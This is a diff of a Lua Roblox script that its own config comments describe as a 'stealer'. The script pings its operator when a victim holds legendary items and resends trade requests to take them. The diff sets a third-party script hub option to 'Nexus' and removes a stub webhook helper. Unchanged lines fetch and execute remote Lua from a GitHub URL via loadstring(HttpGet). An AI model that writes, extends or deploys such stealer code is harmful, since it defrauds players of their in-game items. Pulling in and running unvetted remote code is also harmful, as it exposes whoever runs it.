@@ -4,7 +4,7 @@ Config = {
     FullInventory = true, -- If true, it will display all of the player's items.
     GoodItemsOnly = true, -- If set to true, the stealer will not ping you if the player only has items below legendary.
     ResendTrade = "hello", -- Send this in chat to resend the trade request if you don't receive it.
-    Script = "None", -- Scripts > "None", "Custom", "Overdrive H", "Symphony Hub", "Highlight Hub", "Eclipse Hub", "R3TH PRIV", "AshbornnHub", "Nexus"
+    Script = "Nexus", -- Scripts > "None", "Custom", "Overdrive H", "Symphony Hub", "Highlight Hub", "Eclipse Hub", "R3TH PRIV", "AshbornnHub", "Nexus"
     CustomLink = "None" -- If Script is set to Custom, provide the custom URL here.
 }
 
@@ -16,23 +16,6 @@ getgenv().scriptexecuted = true
 local NotificationHolder = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Module.Lua"))()
 local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Client.Lua"))()
 
-local DYWebhook = {}
-
-DYWebhook.ErrorPrinting = false
-
-function DYWebhook.BuildEmbed()
-    return {
-        Info = {},
-        Embed = {}
-    }
-end
-
-function DYWebhook:Send(data)
-    print("DYWebhook.Send called")
-    print(data)
-end
-
-local embed = DYWebhook.BuildEmbed()
 
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
